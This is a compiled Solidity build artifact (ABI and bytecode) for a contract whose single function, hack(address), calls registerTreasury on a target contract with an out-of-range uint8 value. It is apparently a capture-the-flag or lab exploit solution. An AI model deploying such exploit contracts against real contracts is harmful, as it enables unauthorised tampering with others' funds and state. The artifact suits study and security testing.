{"abi":[{"type":"function","name":"hack","inputs":[{"name":"target","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506102528061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80636c4c174f1461002d575b5f5ffd5b61004061003b3660046101b6565b610042565b005b604080518082018252601781527f726567697374657254726561737572792875696e74382900000000000000000060209182015290517f211c85ab0000000000000000000000000000000000000000000000000000000091810191909152610100602482018190527f211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c5915f9073ffffffffffffffffffffffffffffffffffffffff85169060440160408051601f1981840301815290829052610103916101f0565b5f604051808303815f865af19150503d805f811461013c576040519150601f19603f3d011682016040523d82523d5f602084013e610141565b606091505b50509050806101b0576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600f60248201527f7265676973746572206661696c65640000000000000000000000000000000000604482015260640160405180910390fd5b50505050565b5f602082840312156101c6575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff811681146101e9575f5ffd5b9392505050565b5f82515f5b8181101561020f57602081860181015185830152016101f5565b505f92019182525091905056fea2646970667358221220b17dcd9cfefa9d5ff560ce5d8f261f3c1540b27d1a346e621d1da91b2022708e64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"hack(address)":"6c4c174f"},"id":0}